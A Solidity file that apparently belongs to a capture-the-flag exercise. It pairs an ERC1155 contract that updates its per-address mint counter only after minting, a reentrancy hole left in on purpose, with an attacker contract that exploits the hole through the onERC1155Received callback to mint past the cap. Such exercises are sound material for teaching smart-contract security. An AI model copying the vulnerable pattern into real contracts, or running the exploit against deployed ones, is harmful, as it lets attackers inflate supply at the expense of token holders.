// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ERC1155} from "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

contract Overmint1ERC1155 is ERC1155 {
    using Address for address;

    mapping(address => mapping(uint256 => uint256)) public amountMinted;
    mapping(uint256 => uint256) public totalSupply;

    constructor() ERC1155("Overmint") {}

    function mint(uint256 id, bytes calldata data) external {
        require(amountMinted[msg.sender][id] <= 3, "max 3 NFTs");
        totalSupply[id]++;
        _mint(msg.sender, id, 1, data);
        amountMinted[msg.sender][id]++;
    }

    function success(address _attacker, uint256 id) external view returns (bool) {
        return balanceOf(_attacker, id) == 5;
    }
}

contract Overmint1ERC1155Attacker {
    Overmint1ERC1155 victim;

    uint256 public constant TOKEN_ID = 777;
    uint256 public txCount;

    constructor(address _victim) {
        victim = Overmint1ERC1155(_victim);
    }

    function attack() external {
        txCount++;
        victim.mint(TOKEN_ID, "");
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes memory data)
        external
        returns (bytes4 response)
    {
        if (victim.balanceOf(address(this), id) < 5) {
            victim.mint(id, "");
        }

        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }
}
